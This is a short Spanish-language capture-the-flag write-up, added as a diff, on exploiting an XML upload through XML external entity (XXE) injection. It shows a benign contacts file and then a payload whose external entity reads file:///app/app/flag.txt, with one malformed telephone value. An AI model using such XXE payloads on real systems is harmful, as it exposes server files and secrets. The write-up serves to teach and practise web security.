@@ -1,0 +1,34 @@
+Al ver que se debía subir un archivo en formato xml, busqué las vulnerabilidades que existian al usar este tipo de archivos, encontrando la de XML external entity (XXE) injection, la cual es explicada en esta pagina, ademas de dar un ejemplo y el payload para explotarla.
+https://portswigger.net/web-security/xxe
+
+1. Una vez compendiendo en que consistía la vulnerabilidad, subí un archivo xml al azar. 
+2. Al ver un error, causado por no respetar el formato proporcionado en la pagina del reto, subí nuevamente otro con el formato exacto y valores arbitrarios, para ver que es lo que me devolvía. (contactos.xml)
+
+    <?xml version="1.0" encoding="UTF-8"?>
+    <directorio>
+        <contacto>
+            <nombre>poc1</nombre>
+            <telefono>55555</telefono>
+        </contacto>
+
+        <contacto>
+            <nombre>poc2</nombre>
+            <telefono>22222</telefono>
+        </contacto>
+    </directorio>
+
+3. Una vez que identifiqué como se debían enviar los datos y como eran devueltos, procedí a incluir el playload en el archivo a subir (contactos1.xml), esta vez, con un resultado exitoso.
+
+    <?xml version="1.0" encoding="UTF-8"?>
+    <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///app/app/flag.txt"> ]>
+    <directorio>
+        <contacto>
+            <nombre>poc1</nombre>
+            <telefono>55555</telefono>
+        </contacto>
+
+        <contacto>
+            <nombre>&xxe;</nombre>
+            <telefono>5<adfdew5555</telefono>
+        </contacto>
+    </directorio>
